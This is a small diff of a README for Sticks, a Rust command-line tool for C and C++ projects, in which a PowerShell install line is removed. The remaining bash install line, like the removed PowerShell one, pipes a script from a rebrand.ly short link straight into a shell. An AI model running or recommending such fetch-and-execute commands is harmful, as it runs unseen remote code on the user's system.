@@ -22,10 +22,6 @@ Sticks is a Rust command-line tool for managing C and C++ projects. It simplifie
 curl -fsSL https://rebrand.ly/tyzot1g | bash
 ```
 
-```powershell
-iwr -useb https://rebrand.ly/36j6rhv | iex
-```
-
 **OR**
 
 ```bash
